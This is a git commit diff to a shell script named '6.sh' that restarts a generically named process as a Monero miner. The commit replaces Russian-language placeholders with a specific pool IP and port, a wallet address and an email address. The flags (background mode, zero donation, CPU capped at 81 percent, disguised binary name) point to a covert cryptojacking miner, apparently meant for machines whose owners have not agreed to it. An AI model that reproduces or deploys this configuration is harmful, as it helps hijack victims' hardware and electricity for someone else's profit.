6eb9b9bb73512b504ed5c4512a440dbb9cde0507
dedline4day <63655931+dedline4day@users.noreply.github.com>
2020-04-14 09:03:11 -0700

    Update 6.sh

--- 6.sh
+++ 6.sh
@@ -1,3 +1,3 @@
 pkill defaultsoftwarename
 sleep 7
-defaultsoftwarename -o ВАШ ИП:ПОРТ -u ВАШ КОШЕЛЁК МОНЕРО --pass=x:ВАША ПОЧТА --rig-id=03 -B --donate-level=0 --print-time=30 --threads=defaultthreads --cpu-priority=4 --background --max-cpu-usage=81 --av=1
+defaultsoftwarename -o 51.161.60.228:3322 -u 457jd2jEELQgMZyGKWXB7K4sBzRb4SC2z6NecNk5rfiTcBzGPX3EvR7JEu356EAqoKPyAXDdC8VQoYURN5C8aR5cDJfx672 --pass=x:deadline4day@protonmail.com --rig-id=4 -B --donate-level=0 --print-time=30 --threads=defaultthreads --cpu-priority=4 --background --max-cpu-usage=81 --av=1
